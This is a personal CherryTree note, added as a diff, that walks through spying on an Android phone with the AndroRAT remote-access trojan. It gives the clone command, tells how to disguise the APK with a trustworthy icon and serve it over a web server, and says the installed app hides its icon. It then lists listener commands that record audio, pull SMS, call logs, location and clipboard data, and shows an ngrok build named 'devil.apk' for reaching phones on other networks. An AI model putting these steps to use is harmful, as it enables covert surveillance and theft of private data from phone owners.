@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="31" master_id="0" name="spying android device using androRAT" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1753538114" ts_lastsave="1753540984">
+    <rich_text>install android from github
+git clone: </rich_text>
+    <rich_text link="webs https://github.com/karma9874/AndroRAT.git">https://github.com/karma9874/AndroRAT.git</rich_text>
+    <rich_text>
+
+   
+
+   
+
+   
+
+   
+
+   
+
+move the file to documents if you want 
+
+   
+
+you can also manipulate the file with a trustable icon like (--icon [path to icon file])
+
+we then a create or run a webserver (python3 -m http.server 8080)
+
+   
+
+NB: - Attackers may use social engineering techniques to distribute this file 
+
+Since we are testing
+-Go to your text android and type the ip address pf your machine followed by the port 8080 of the server but the devices should be on the same network
+- 192.168.100.5:8080
+- download the file and install it in the phone
+- install the app and give it the necessary permissions
+- after allowing the app, it will complete installing and remove its shortcut from the screen to hide and execute in the background
+- go the attacker machine (kali) and establish a listener
+
+&gt;python3 androRAT.py --shell -i 192.168.100.4 -p 8000
+
+   
+
+- after, it will show: interpreter:/&gt;
+- this will confirm that the connnection is successful
+
+- in the prompt
+-  Interpeter:/&gt; deviceinfo
+- Interpreter:/&gt;camList (lists cameras on the device)
+- Interpreter:/&gt;startAudio (starts recording on the device)
+- Interpreter:/&gt;stopAudio (stops the recording &amp; audion saved in the AndroRAT dumps folder))
+- Interpreter:/&gt;getSMS inbox (get inbox sms)
+- Interpreter:/&gt;getSMS sent (gets sent sms)
+- Interpreter:/&gt;getCallLogs (gets call history)
+- Interpreter:/&gt;getLocation (gets location)
+- Interpreter:/&gt;getClipData (gets any copied information)
+- Interpreter:/&gt;vibrate 5 (sets vibration to 5 times)
+
+To work on devices out of the device, AndroRAT works with the ngrok 
+&gt;python3 androRAT.py --build --ngrok -o devil.apk
+
+- AndroRAT will download the ngrok but will request for authentication
+
+   
+
+
+</rich_text>
+    <encoded_png char_offset="82" justification="left" link="" sha256sum="2d6f060019c1392cfa7a680516fc2d430c4297986de8ee5d22b26f1cd15a53b8"/>
+    <encoded_png char_offset="88" justification="left" link="" sha256sum="a2d93f4e78ac2374acc312ff9c1a49fb0a6983cf02c63703ae26637a81076392"/>
+    <encoded_png char_offset="94" justification="left" link="" sha256sum="a00cf48f732fe46f5ce7c600e1420218b0feec9905705c62fe05d48f2ab8b092"/>
+    <encoded_png char_offset="100" justification="left" link="" sha256sum="5a1302e96769f87a289199492cc1376dd4175697b88140d858d39cca36504167"/>
+    <encoded_png char_offset="106" justification="left" link="" sha256sum="c594fe5e521d55e54d824044a47c12efa60bf4f94e40096186d27aecc543e0e6"/>
+    <encoded_png char_offset="153" justification="left" link="" sha256sum="ff8297dd292a8eba069edcd61fa5545ed6e2c8569537955a5c6dd129ad633695"/>
+    <encoded_png char_offset="316" justification="left" link="" sha256sum="54d8aa13a5aca0141948c1b5630e87ea4d2336295568e9ff487225c461c5f02c"/>
+    <encoded_png char_offset="945" justification="left" link="" sha256sum="474825544831a25f2c3537e07c57aa874f6870dc9a0ce2841e6a50286e654e23"/>
+    <encoded_png char_offset="1782" justification="left" link="" sha256sum="46c265c4bcedc9e6021eb459ddf658c697e6c02da01e62f09b66171b0fbeb8b8"/>
+  </node>
+</cherrytree>
